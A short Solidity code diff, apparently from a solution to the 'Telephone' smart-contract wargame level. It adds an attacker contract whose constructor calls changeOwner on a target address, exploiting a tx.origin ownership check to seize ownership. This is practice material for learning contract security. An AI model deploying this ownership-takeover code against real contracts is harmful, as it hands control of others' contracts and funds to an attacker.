@@ -23,3 +23,13 @@ contract exploit {
         a.changeOwner(msg.sender);
     }
 }
+
+interface TelephoneInterface {
+    function changeOwner(address) external ;
+}
+
+contract Telephone {
+  constructor(address addr)  {
+    TelephoneInterface(addr).changeOwner(msg.sender);
+  }
+}
